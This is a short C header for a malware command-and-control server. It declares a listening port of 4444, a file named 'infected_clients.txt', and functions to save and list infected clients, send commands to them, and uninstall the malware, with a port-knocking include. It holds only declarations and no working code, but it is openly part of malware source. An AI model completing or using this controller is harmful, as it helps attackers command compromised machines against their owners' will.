#ifndef C2_SERVER_H
#define C2_SERVER_H

#include "port_knocking.h"

#define SERVER_PORT 4444
#define DATA_FILE "infected_clients.txt"

void start_server();
void save_client_data(const char *client_info);
void list_infected_clients();
void send_command_to_client(int client_sock);
void uninstall_malware(int client_sock);

#endif
